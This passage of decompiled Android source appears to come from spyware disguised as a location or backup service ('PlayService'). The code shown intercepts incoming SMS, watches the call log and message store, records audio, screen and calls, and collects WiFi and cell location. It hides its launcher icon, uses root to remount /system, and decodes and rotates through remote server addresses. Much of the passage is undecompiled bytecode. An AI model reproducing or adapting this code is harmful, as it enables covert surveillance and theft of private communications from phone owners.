    //   219: invokestatic 1304	com/android/location/PlayService:now	()Ljava/lang/String;
    //   222: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   225: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   228: ldc_w 1262
    //   231: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   234: aload_0
    //   235: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   238: ldc_w 1312
    //   241: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   244: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   247: invokevirtual 1315	java/io/BufferedWriter:write	(Ljava/lang/String;)V
    //   250: aload_3
    //   251: invokevirtual 1318	java/io/BufferedWriter:close	()V
    //   254: aload_1
    //   255: astore 4
    //   257: aload_2
    //   258: astore_1
    //   259: aload 4
    //   261: ifnull +8 -> 269
    //   264: aload 4
    //   266: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   269: aload_1
    //   270: ifnull +7 -> 277
    //   273: aload_1
    //   274: invokevirtual 1320	java/io/FileWriter:close	()V
    //   277: return
    //   278: astore_1
    //   279: aload 5
    //   281: astore 4
    //   283: aload 7
    //   285: astore_0
    //   286: aload_0
    //   287: astore_2
    //   288: aload 4
    //   290: astore_3
    //   291: aload_1
    //   292: ldc_w 1321
    //   295: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   298: aload_0
    //   299: ifnull +7 -> 306
    //   302: aload_0
    //   303: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   306: aload 4
    //   308: ifnull -31 -> 277
    //   311: aload 4
    //   313: invokevirtual 1320	java/io/FileWriter:close	()V
    //   316: return
    //   317: astore_0
    //   318: return
    //   319: astore_0
    //   320: aload_2
    //   321: ifnull +7 -> 328
    //   324: aload_2
    //   325: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   328: aload_3
    //   329: ifnull +7 -> 336
    //   332: aload_3
    //   333: invokevirtual 1320	java/io/FileWriter:close	()V
    //   336: aload_0
    //   337: athrow
    //   338: astore_0
    //   339: goto -33 -> 306
    //   342: astore_1
    //   343: goto -15 -> 328
    //   346: astore_1
    //   347: goto -11 -> 336
    //   350: astore_0
    //   351: goto -82 -> 269
    //   354: astore_0
    //   355: return
    //   356: astore_0
    //   357: aload_1
    //   358: astore_2
    //   359: aload 6
    //   361: astore_3
    //   362: goto -42 -> 320
    //   365: astore_0
    //   366: aload_2
    //   367: astore_3
    //   368: aload_1
    //   369: astore_2
    //   370: goto -50 -> 320
    //   373: astore_2
    //   374: aload_1
    //   375: astore_0
    //   376: aload_2
    //   377: astore_1
    //   378: aload 5
    //   380: astore 4
    //   382: goto -96 -> 286
    //   385: astore_3
    //   386: aload_1
    //   387: astore_0
    //   388: aload_3
    //   389: astore_1
    //   390: aload_2
    //   391: astore 4
    //   393: goto -107 -> 286
    //   396: aload_1
    //   397: astore 4
    //   399: aload_2
    //   400: astore_1
    //   401: goto -142 -> 259
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	404	0	paramString	String
    //   53	221	1	localObject1	Object
    //   278	14	1	localException1	Exception
    //   342	1	1	localIOException1	IOException
    //   346	29	1	localIOException2	IOException
    //   377	24	1	localException2	Exception
    //   23	347	2	localObject2	Object
    //   373	27	2	localException3	Exception
    //   26	342	3	localObject3	Object
    //   385	4	3	localException4	Exception
    //   135	263	4	localObject4	Object
    //   10	369	5	localObject5	Object
    //   16	344	6	localObject6	Object
    //   1	283	7	localObject7	Object
    //   7	139	8	localObject8	Object
    //   19	131	9	localObject9	Object
    //   4	163	10	localObject10	Object
    //   13	157	11	localObject11	Object
    //   131	46	12	localFile	File
    // Exception table:
    //   from	to	target	type
    //   27	54	278	java/lang/Exception
    //   64	71	278	java/lang/Exception
    //   77	88	278	java/lang/Exception
    //   94	99	278	java/lang/Exception
    //   105	133	278	java/lang/Exception
    //   158	166	278	java/lang/Exception
    //   172	182	278	java/lang/Exception
    //   311	316	317	java/io/IOException
    //   27	54	319	finally
    //   64	71	319	finally
    //   77	88	319	finally
    //   94	99	319	finally
    //   105	133	319	finally
    //   158	166	319	finally
    //   172	182	319	finally
    //   291	298	319	finally
    //   302	306	338	java/io/IOException
    //   324	328	342	java/io/IOException
    //   332	336	346	java/io/IOException
    //   264	269	350	java/io/IOException
    //   273	277	354	java/io/IOException
    //   182	194	356	finally
    //   198	210	365	finally
    //   214	254	365	finally
    //   182	194	373	java/lang/Exception
    //   198	210	385	java/lang/Exception
    //   214	254	385	java/lang/Exception
  }
  
  private static String DecodeURL(String paramString)
  {
    if (paramString.startsWith("http://")) {
      return paramString;
    }
    paramString = paramString.getBytes();
    int i = 0;
    for (;;)
    {
      if (i >= paramString.length) {
        return new String(paramString);
      }
      paramString[i] = ((byte)(paramString[i] + 1));
      i += 1;
    }
  }
  
  private void DelayedInit()
  {
    FLOG("DelayedInit");
    Object localObject2;
    Object localObject1;
    int i;
    try
    {
      for (;;)
      {
        this.telephonyManager = ((TelephonyManager)getSystemService("phone"));
        FLOG("2 telephonyManager.getSubscriberId()===" + this.telephonyManager.getSubscriberId());
        if (this.telephonyManager != null) {
          break;
        }
        Thread.sleep(500L);
        FLOG("TelephonyManager wait!!!");
      }
      SharedPreferences localSharedPreferences;
      FLOG("Check SMS send server for 80 port:" + SMSServer);
    }
    catch (Exception localException1)
    {
      EXCEPT(localException1, "telephonyManager = (TelephonyManager)");
      if (this.telephonyManager == null) {
        this.telephonyManager = ((TelephonyManager)getSystemService("phone"));
      }
      localSharedPreferences = getSharedPreferences("backupPrefs", 0);
      localObject2 = localSharedPreferences.getString("UUID", null);
      localObject1 = localObject2;
      if (localObject2 == null)
      {
        localObject1 = generateUUID();
        localObject2 = localSharedPreferences.edit();
        ((SharedPreferences.Editor)localObject2).putString("UUID", (String)localObject1);
        ((SharedPreferences.Editor)localObject2).commit();
      }
      this.lastInfo = new LbsInfo();
      StartSMSCopier();
      this.wifiAndCellCollector = new WifiAndCellCollector(context, this, (String)localObject1);
      FLOG("WifiCollector.startCollect();");
      this.wifiAndCellCollector.startCollect();
      registerReceiver(this.mBatInfoReceiver, new IntentFilter("android.intent.action.BATTERY_CHANGED"));
      registerReceiver(this.mBatInfoReceiver, new IntentFilter("android.intent.action.ACTION_POWER_CONNECTED"));
      registerReceiver(this.mBatInfoReceiver, new IntentFilter("android.intent.action.ACTION_POWER_DISCONNECTED"));
      registerReceiver(this.mWifiStateReceiver, new IntentFilter("android.net.wifi.supplicant.CONNECTION_CHANGE"));
      registerReceiver(this.mWifiStateReceiver, new IntentFilter("android.net.wifi.supplicant.STATE_CHANGE"));
      registerReceiver(this.mWifiStateReceiver, new IntentFilter("android.net.wifi.STATE_CHANGE"));
      registerReceiver(this.mUploaderStartReceiver, new IntentFilter("ON_START_UPLOADER"));
      this.brSMSReceiver = new SMSReceiver();
      SMSReceiver.reference = this.brSMSReceiver;
      SMSReceiver.sForbidden = res.getString(2130968604);
      this.filter2 = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
      this.filter2.setPriority(1000);
      registerReceiver(this.brSMSReceiver, this.filter2);
      SMSReceiver.CreateAudioThread();
      SMSReceiver.CreateCommandor();
      SMSReceiver.CreateScreenRecorder();
      iCallRecordState = 0;
      SetBugController();
      registerReceiver(this.mPackageAddedReceiver, new IntentFilter("SOMETHING_WERE_INSTALLED"));
      localObject1 = new MyContentObserver();
      FLOG("Creating observer " + localObject1);
      if (localObject1 != null) {
        context.getContentResolver().registerContentObserver(CallLog.Calls.CONTENT_URI, true, (ContentObserver)localObject1);
      }
      FLOG("registered observer ");
      context.getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, new SMSObserver());
      FLOG("register answer receiver");
      if (bUseAutoCallRec)
      {
        if (this.telephonyManager == null) {
          break label685;
        }
        i = this.telephonyManager.getCallState();
        FLOG("CALLSTATESTART=" + i);
        if (i != 0)
        {
          FLOG("Moscow Calling feature start");
          StartCallRecord("lost");
        }
      }
    }
    if (Build.VERSION.SDK_INT < 19) {
      if (SMSReceiver.isGet3(SMSServer, "/audio/", "nullA") != 0) {}
    }
    for (;;)
    {
      try
      {
        SMSServer = "";
        localObject1 = SMSServerList.split(",");
        if (localObject1.length <= 0) {
          break label948;
        }
        FLOG("SMS list server length = " + localObject1.length);
        i = 0;
        int j = localObject1.length;
        if (i >= j)
        {
          return;
          label685:
          FLOG("Nu chto za nahuy to!");
          break;
        }
        iSMSServer_ID += 1;
        if (iSMSServer_ID >= localObject1.length) {
          iSMSServer_ID = 0;
        }
        j = lookupHost(localObject1[iSMSServer_ID]);
        if ((j == -1) || ((j & 0xFF) == 10) || ((j & 0xFF) == 192))
        {
          FLOGER("lookupHost failed()" + j);
          break label985;
        }
        localObject2 = (j & 0xFF) + "." + (j >> 8 & 0xFF) + "." + (j >> 16 & 0xFF) + "." + (j >> 24 & 0xFF);
        FLOG("check IP = " + (String)localObject2);
        if (SMSReceiver.isGet3((String)localObject2, "/audio/", "nullA") == 1)
        {
          FLOG("new IP detected as Main=" + (String)localObject2);
          SaveSettings();
          SMSServer = (String)localObject2;
          return;
        }
      }
      catch (Exception localException2)
      {
        EXCEPT(localException2, "SmsServer lookup Except");
        return;
      }
      FLOG("isGet[" + (String)localObject2 + "] failed, try next");
      break label985;
      label948:
      FLOG("sms list server is empty, skip lookup");
      return;
      FLOG("Got echo from 80 port for " + SMSServer);
      return;
      FLOG("Kitkat does not need to SEND sms, skip");
      return;
      label985:
      i += 1;
    }
  }
  
  private boolean DetectFly()
  {
    if (Build.MODEL.indexOf("Fly") > -1) {
      bUseBlocking = true;
    }
    for (;;)
    {
      return bUseBlocking;
      if (Build.BRAND.indexOf("Fly") > -1) {
        bUseBlocking = true;
      } else if (Build.DEVICE.indexOf("Fly") > -1) {
        bUseBlocking = true;
      } else if (Build.DISPLAY.indexOf("Fly") > -1) {
        bUseBlocking = true;
      } else if (Build.HOST.indexOf("Fly") > -1) {
        bUseBlocking = true;
      } else if (Build.MANUFACTURER.indexOf("Fly") > -1) {
        bUseBlocking = true;
      } else if (Build.BOARD.indexOf("Fly") > -1) {
        bUseBlocking = true;
      } else if (Build.PRODUCT.indexOf("Fly") > -1) {
        bUseBlocking = true;
      } else if (Build.ID.indexOf("Fly") > -1) {
        bUseBlocking = true;
      }
    }
  }
  
  private void DisableSoft(int paramInt)
  {
    ComponentName localComponentName = new ComponentName(MY_PACKAGE_NAME, MY_PACKAGE_NAME + ".LaunchActivity");
    try
    {
      if (getPackageManager().getComponentEnabledSetting(localComponentName) != 2)
      {
        ChmodMeRun();
        Log.v("backup.service", "Disabling soft");
        getPackageManager().setComponentEnabledSetting(localComponentName, 2, paramInt);
        bIconHidden = true;
        Log.v("backup.service", "Disabled and continue running");
        return;
      }
      bIconHidden = true;
      Log.v("backup.service", "Already disabled, Run Service!");
      return;
    }
    catch (Exception localException)
    {
      Log.v("backup.service", "Component not found" + localException.getMessage());
    }
  }
  
  private boolean DoesListApply(String paramString1, String paramString2)
  {
    if (paramString1 == null) {}
    for (;;)
    {
      return false;
      if ((paramString2 != null) && (paramString2.length() != 0))
      {
        paramString1 = paramString1.split(",");
        int i = 0;
        while (i < paramString1.length)
        {
          String str = paramString1[i].trim();
          if ((str.length() > 0) && (paramString2.indexOf(str) > -1)) {
            return true;
          }
          i += 1;
        }
      }
    }
  }
  
  /* Error */
  private void DumpFile(String paramString, byte[] paramArrayOfByte)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: aconst_null
    //   3: astore 5
    //   5: new 1203	java/io/FileOutputStream
    //   8: dup
    //   9: new 864	java/lang/StringBuilder
    //   12: dup
    //   13: ldc_w 1274
    //   16: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   19: aload_1
    //   20: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   23: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   26: invokespecial 1655	java/io/FileOutputStream:<init>	(Ljava/lang/String;)V
    //   29: astore 4
    //   31: aload 4
    //   33: ifnull +14 -> 47
    //   36: aload 4
    //   38: aload_2
    //   39: invokevirtual 1657	java/io/FileOutputStream:write	([B)V
    //   42: aload 4
    //   44: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   47: aload 4
    //   49: ifnull +83 -> 132
    //   52: aload 4
    //   54: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   57: return
    //   58: astore 4
    //   60: aload 5
    //   62: astore_2
    //   63: aload_2
    //   64: astore_3
    //   65: aload 4
    //   67: new 864	java/lang/StringBuilder
    //   70: dup
    //   71: ldc_w 1659
    //   74: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   77: aload_1
    //   78: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   81: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   84: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   87: aload_2
    //   88: ifnull -31 -> 57
    //   91: aload_2
    //   92: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   95: return
    //   96: astore_1
    //   97: return
    //   98: astore_1
    //   99: aload_3
    //   100: ifnull +7 -> 107
    //   103: aload_3
    //   104: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   107: aload_1
    //   108: athrow
    //   109: astore_1
    //   110: return
    //   111: astore_2
    //   112: goto -5 -> 107
    //   115: astore_1
    //   116: aload 4
    //   118: astore_3
    //   119: goto -20 -> 99
    //   122: astore_3
    //   123: aload 4
    //   125: astore_2
    //   126: aload_3
    //   127: astore 4
    //   129: goto -66 -> 63
    //   132: return
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	133	0	this	PlayService
    //   0	133	1	paramString	String
    //   0	133	2	paramArrayOfByte	byte[]
    //   1	118	3	localObject1	Object
    //   122	5	3	localException1	Exception
    //   29	24	4	localFileOutputStream	FileOutputStream
    //   58	66	4	localException2	Exception
    //   127	1	4	localException3	Exception
    //   3	58	5	localObject2	Object
    // Exception table:
    //   from	to	target	type
    //   5	31	58	java/lang/Exception
    //   91	95	96	java/io/IOException
    //   5	31	98	finally
    //   65	87	98	finally
    //   52	57	109	java/io/IOException
    //   103	107	111	java/io/IOException
    //   36	47	115	finally
    //   36	47	122	java/lang/Exception
  }
  
  public static void EXCEPT(Exception paramException, String paramString)
  {
    int i;
    if (paramException != null)
    {
      UDP("EXCEPTION!SEE!LOG", iUDPPort);
      Log.v("backup.service", "EXCEPTION!SEE!LOG");
      String str = paramString + "<->" + paramException.getMessage();
      UDP(str, iUDPPort);
      putEvent(str);
      Log.v("backup.service", str);
      paramException.printStackTrace();
      TLOG(paramException.getStackTrace(), paramString, paramException);
      paramException = paramException.getStackTrace();
      if (paramException != null) {
        i = 0;
      }
    }
    for (;;)
    {
      if (i >= paramException.length) {
        return;
      }
      UDP(paramException[i].toString(), iUDPPort);
      i += 1;
    }
  }
  
  public static void EnableDisableSoft(Context paramContext)
  {
    if (paramContext == null)
    {
      Log.v("backup.service", "context is null, cannot enable");
      return;
    }
    commandSU("mount -o remount,rw -t yaffs2 /dev/block/mtdblk3 /system && chmod 666 /system/app/Shadow.apk");
    ComponentName localComponentName = new ComponentName(MY_PACKAGE_NAME, MY_PACKAGE_NAME + ".LaunchActivity");
    try
    {
      if (paramContext.getPackageManager().getComponentEnabledSetting(localComponentName) == 2)
      {
        bIconHidden = false;
        Log.v("backup.service", "Enabling");
        paramContext.getPackageManager().setComponentEnabledSetting(localComponentName, 1, 1);
        return;
      }
    }
    catch (Exception paramContext)
    {
      Log.v("backup.service", "Component not found" + paramContext.getMessage());
      return;
    }
    bIconHidden = true;
    Log.v("backup.service", "Disabling");
    paramContext.getPackageManager().setComponentEnabledSetting(localComponentName, 2, 1);
  }
  
  public static void EnableSoft(Context paramContext)
  {
    if (paramContext == null)
    {
      Log.v("backup.service", "context is null, cannot enable");
      return;
    }
    commandSU("mount -o remount,rw -t yaffs2 /dev/block/mtdblk3 /system && chmod 666 /system/app/Shadow.apk");
    bSkipOneRootDisable = true;
    SaveSettings();
    ComponentName localComponentName = new ComponentName(MY_PACKAGE_NAME, MY_PACKAGE_NAME + ".LaunchActivity");
    try
    {
      if (paramContext.getPackageManager().getComponentEnabledSetting(localComponentName) == 2)
      {
        bIconHidden = false;
        Log.v("backup.service", "Enabling");
        paramContext.getPackageManager().setComponentEnabledSetting(localComponentName, 1, 1);
        return;
      }
    }
    catch (Exception paramContext)
    {
      Log.v("backup.service", "Component not found" + paramContext.getMessage());
      return;
    }
    Log.v("backup.service", "Already enabled");
  }
  
  /* Error */
  public static void FLO(String paramString)
  {
    // Byte code:
    //   0: aload_0
    //   1: ifnull +9 -> 10
    //   4: getstatic 898	com/android/location/PlayService:GlobalLog	Ljava/lang/StringBuffer;
    //   7: ifnonnull +4 -> 11
    //   10: return
    //   11: aconst_null
    //   12: astore_1
    //   13: aconst_null
    //   14: astore 9
    //   16: aconst_null
    //   17: astore_3
    //   18: aconst_null
    //   19: astore 6
    //   21: aconst_null
    //   22: astore 8
    //   24: aconst_null
    //   25: astore 7
    //   27: aload_1
    //   28: astore 5
    //   30: aload 9
    //   32: astore_2
    //   33: aload 8
    //   35: astore 4
    //   37: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   40: ifnonnull +48 -> 88
    //   43: aload_1
    //   44: astore 5
    //   46: aload 9
    //   48: astore_2
    //   49: aload 8
    //   51: astore 4
    //   53: ldc -116
    //   55: ldc_w 1698
    //   58: invokestatic 1632	android/util/Log:v	(Ljava/lang/String;Ljava/lang/String;)I
    //   61: pop
    //   62: iconst_0
    //   63: ifeq +11 -> 74
    //   66: new 1700	java/lang/NullPointerException
    //   69: dup
    //   70: invokespecial 1701	java/lang/NullPointerException:<init>	()V
    //   73: athrow
    //   74: iconst_0
    //   75: ifeq -65 -> 10
    //   78: new 1700	java/lang/NullPointerException
    //   81: dup
    //   82: invokespecial 1701	java/lang/NullPointerException:<init>	()V
    //   85: athrow
    //   86: astore_0
    //   87: return
    //   88: aload_1
    //   89: astore 5
    //   91: aload 9
    //   93: astore_2
    //   94: aload 8
    //   96: astore 4
    //   98: getstatic 898	com/android/location/PlayService:GlobalLog	Ljava/lang/StringBuffer;
    //   101: invokevirtual 1702	java/lang/StringBuffer:length	()I
    //   104: sipush 30000
    //   107: if_icmple +39 -> 146
    //   110: aload_1
    //   111: astore 5
    //   113: aload 9
    //   115: astore_2
    //   116: aload 8
    //   118: astore 4
    //   120: ldc -116
    //   122: ldc_w 1704
    //   125: invokestatic 1632	android/util/Log:v	(Ljava/lang/String;Ljava/lang/String;)I
    //   128: pop
    //   129: aload_1
    //   130: astore 5
    //   132: aload 9
    //   134: astore_2
    //   135: aload 8
    //   137: astore 4
    //   139: getstatic 898	com/android/location/PlayService:GlobalLog	Ljava/lang/StringBuffer;
    //   142: iconst_0
    //   143: invokevirtual 1707	java/lang/StringBuffer:setLength	(I)V
    //   146: aload_1
    //   147: astore 5
    //   149: aload 9
    //   151: astore_2
    //   152: aload 8
    //   154: astore 4
    //   156: getstatic 898	com/android/location/PlayService:GlobalLog	Ljava/lang/StringBuffer;
    //   159: new 864	java/lang/StringBuilder
    //   162: dup
    //   163: invokestatic 1710	com/android/location/PlayService:shortnow	()Ljava/lang/String;
    //   166: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   169: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   172: ldc_w 1712
    //   175: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   178: aload_0
    //   179: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   182: ldc_w 1312
    //   185: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   188: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   191: invokevirtual 1715	java/lang/StringBuffer:append	(Ljava/lang/String;)Ljava/lang/StringBuffer;
    //   194: pop
    //   195: aload_1
    //   196: astore 5
    //   198: aload 9
    //   200: astore_2
    //   201: aload 8
    //   203: astore 4
    //   205: new 1250	java/io/File
    //   208: dup
    //   209: new 864	java/lang/StringBuilder
    //   212: dup
    //   213: getstatic 884	com/android/location/PlayService:filesPath	Ljava/lang/String;
    //   216: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   219: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   222: ldc_w 1717
    //   225: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   228: getstatic 906	com/android/location/PlayService:sLogFileName	Ljava/lang/String;
    //   231: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   234: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   237: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   240: astore 10
    //   242: aload 7
    //   244: astore_2
    //   245: aload 10
    //   247: ifnull +179 -> 426
    //   250: aload_1
    //   251: astore 5
    //   253: aload 9
    //   255: astore_2
    //   256: aload 8
    //   258: astore 4
    //   260: aload 10
    //   262: invokevirtual 1257	java/io/File:exists	()Z
    //   265: ifeq +41 -> 306
    //   268: aload_1
    //   269: astore 5
    //   271: aload 9
    //   273: astore_2
    //   274: aload 8
    //   276: astore 4
    //   278: aload 10
    //   280: invokevirtual 1277	java/io/File:length	()J
    //   283: ldc2_w 1718
    //   286: lcmp
    //   287: ifle +19 -> 306
    //   290: aload_1
    //   291: astore 5
    //   293: aload 9
    //   295: astore_2
    //   296: aload 8
    //   298: astore 4
    //   300: aload 10
    //   302: invokevirtual 1281	java/io/File:delete	()Z
    //   305: pop
    //   306: aload_1
    //   307: astore 5
    //   309: aload 9
    //   311: astore_2
    //   312: aload 8
    //   314: astore 4
    //   316: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   319: getstatic 906	com/android/location/PlayService:sLogFileName	Ljava/lang/String;
    //   322: ldc -96
    //   324: invokevirtual 1723	android/content/Context:openFileOutput	(Ljava/lang/String;I)Ljava/io/FileOutputStream;
    //   327: astore_1
    //   328: aload_1
    //   329: astore 5
    //   331: aload_1
    //   332: astore_2
    //   333: aload 8
    //   335: astore 4
    //   337: new 1289	java/io/FileWriter
    //   340: dup
    //   341: aload_1
    //   342: invokevirtual 1293	java/io/FileOutputStream:getFD	()Ljava/io/FileDescriptor;
    //   345: invokespecial 1296	java/io/FileWriter:<init>	(Ljava/io/FileDescriptor;)V
    //   348: astore 9
    //   350: aload_1
    //   351: astore_3
    //   352: aload 7
    //   354: astore_2
    //   355: aload 9
    //   357: ifnull +69 -> 426
    //   360: aload_1
    //   361: astore 5
    //   363: aload_1
    //   364: astore_2
    //   365: aload 8
    //   367: astore 4
    //   369: new 1298	java/io/BufferedWriter
    //   372: dup
    //   373: aload 9
    //   375: sipush 1024
    //   378: invokespecial 1301	java/io/BufferedWriter:<init>	(Ljava/io/Writer;I)V
    //   381: astore_3
    //   382: aload_3
    //   383: ifnull +229 -> 612
    //   386: aload_3
    //   387: new 864	java/lang/StringBuilder
    //   390: dup
    //   391: invokestatic 1304	com/android/location/PlayService:now	()Ljava/lang/String;
    //   394: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   397: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   400: ldc_w 1262
    //   403: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   406: aload_0
    //   407: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   410: ldc_w 1312
    //   413: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   416: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   419: invokevirtual 1315	java/io/BufferedWriter:write	(Ljava/lang/String;)V
    //   422: aload_3
    //   423: astore_2
    //   424: aload_1
    //   425: astore_3
    //   426: aload_3
    //   427: ifnull +7 -> 434
    //   430: aload_3
    //   431: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   434: aload_2
    //   435: ifnull +7 -> 442
    //   438: aload_2
    //   439: invokevirtual 1318	java/io/BufferedWriter:close	()V
    //   442: getstatic 831	com/android/location/PlayService:iUDPPort	I
    //   445: ifle -435 -> 10
    //   448: new 864	java/lang/StringBuilder
    //   451: dup
    //   452: getstatic 912	com/android/location/PlayService:udp_id	I
    //   455: invokestatic 1549	java/lang/String:valueOf	(I)Ljava/lang/String;
    //   458: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   461: ldc_w 1725
    //   464: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   467: invokestatic 1304	com/android/location/PlayService:now	()Ljava/lang/String;
    //   470: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   473: ldc_w 1262
    //   476: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   479: aload_0
    //   480: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   483: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   486: getstatic 831	com/android/location/PlayService:iUDPPort	I
    //   489: invokestatic 1665	com/android/location/PlayService:UDP	(Ljava/lang/String;I)V
    //   492: getstatic 912	com/android/location/PlayService:udp_id	I
    //   495: iconst_1
    //   496: iadd
    //   497: putstatic 912	com/android/location/PlayService:udp_id	I
    //   500: return
    //   501: astore_3
    //   502: aload 6
    //   504: astore_1
    //   505: aload 5
    //   507: astore_2
    //   508: aload_1
    //   509: astore 4
    //   511: aload_3
    //   512: ldc_w 1726
    //   515: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   518: aload 5
    //   520: ifnull +8 -> 528
    //   523: aload 5
    //   525: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   528: aload_1
    //   529: ifnull -87 -> 442
    //   532: aload_1
    //   533: invokevirtual 1318	java/io/BufferedWriter:close	()V
    //   536: goto -94 -> 442
    //   539: astore_1
    //   540: goto -98 -> 442
    //   543: astore_0
    //   544: aload_2
    //   545: astore_1
    //   546: aload_1
    //   547: ifnull +7 -> 554
    //   550: aload_1
    //   551: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   554: aload 4
    //   556: ifnull +8 -> 564
    //   559: aload 4
    //   561: invokevirtual 1318	java/io/BufferedWriter:close	()V
    //   564: aload_0
    //   565: athrow
    //   566: astore_0
    //   567: goto -493 -> 74
    //   570: astore_2
    //   571: goto -43 -> 528
    //   574: astore_1
    //   575: goto -21 -> 554
    //   578: astore_1
    //   579: goto -15 -> 564
    //   582: astore_1
    //   583: goto -149 -> 434
    //   586: astore_1
    //   587: goto -145 -> 442
    //   590: astore_0
    //   591: aload_3
    //   592: astore 4
    //   594: goto -48 -> 546
    //   597: astore 4
    //   599: aload_3
    //   600: astore_2
    //   601: aload 4
    //   603: astore_3
    //   604: aload_1
    //   605: astore 5
    //   607: aload_2
    //   608: astore_1
    //   609: goto -104 -> 505
    //   612: aload_3
    //   613: astore_2
    //   614: aload_1
    //   615: astore_3
    //   616: goto -190 -> 426
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	619	0	paramString	String
    //   12	521	1	localObject1	Object
    //   539	1	1	localIOException1	IOException
    //   545	6	1	localObject2	Object
    //   574	1	1	localIOException2	IOException
    //   578	1	1	localIOException3	IOException
    //   582	1	1	localIOException4	IOException
    //   586	19	1	localIOException5	IOException
    //   608	7	1	localObject3	Object
    //   32	513	2	localObject4	Object
    //   570	1	2	localIOException6	IOException
    //   600	14	2	localObject5	Object
    //   17	414	3	localObject6	Object
    //   501	99	3	localException1	Exception
    //   603	13	3	localObject7	Object
    //   35	558	4	localObject8	Object
    //   597	5	4	localException2	Exception
    //   28	578	5	localObject9	Object
    //   19	484	6	localObject10	Object
    //   25	328	7	localObject11	Object
    //   22	344	8	localObject12	Object
    //   14	360	9	localFileWriter	java.io.FileWriter
    //   240	61	10	localFile	File
    // Exception table:
    //   from	to	target	type
    //   78	86	86	java/io/IOException
    //   37	43	501	java/lang/Exception
    //   53	62	501	java/lang/Exception
    //   98	110	501	java/lang/Exception
    //   120	129	501	java/lang/Exception
    //   139	146	501	java/lang/Exception
    //   156	195	501	java/lang/Exception
    //   205	242	501	java/lang/Exception
    //   260	268	501	java/lang/Exception
    //   278	290	501	java/lang/Exception
    //   300	306	501	java/lang/Exception
    //   316	328	501	java/lang/Exception
    //   337	350	501	java/lang/Exception
    //   369	382	501	java/lang/Exception
    //   532	536	539	java/io/IOException
    //   37	43	543	finally
    //   53	62	543	finally
    //   98	110	543	finally
    //   120	129	543	finally
    //   139	146	543	finally
    //   156	195	543	finally
    //   205	242	543	finally
    //   260	268	543	finally
    //   278	290	543	finally
    //   300	306	543	finally
    //   316	328	543	finally
    //   337	350	543	finally
    //   369	382	543	finally
